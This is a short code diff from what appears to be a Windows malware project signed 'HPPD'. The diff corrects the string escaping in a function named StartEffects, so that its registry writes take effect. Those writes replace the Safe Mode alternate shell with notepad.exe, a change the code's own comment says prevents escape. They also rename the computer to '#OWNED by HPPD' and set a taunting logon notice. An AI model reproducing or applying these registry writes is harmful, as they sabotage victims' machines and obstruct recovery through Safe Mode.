@@ -414,22 +414,22 @@ void StartEffects(bool noGui)
 
         // partezinha daora
 
-        Reg::Write(L"HKLM\System\CurrentControlSet\Control\SafeBoot\AlternateShell",
+        Reg::Write(L"HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell",
             L"notepad.exe", // noescape tipo merda
             L"REG_SZ"
         );
 
-        Reg::Write(L"HKLM\System\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName",
+        Reg::Write(L"HKLM\\System\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName\\ComputerName",
             L"#OWNED by HPPD", // lol
             L"REG_SZ"
         );
 
-        Reg::Write(L"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticecaption",
+        Reg::Write(L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\legalnoticecaption",
             L"#OWNED by HPPD",
             L"REG_SZ"
         );
 
-        Reg::Write(L"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticetext",
+        Reg::Write(L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\legalnoticetext",
             L"Wow, seems that someone wants to escape from me, huh?\r\nWell, guess what? I'm back, bitch, watchugonnado now?",
             L"REG_SZ"
         );
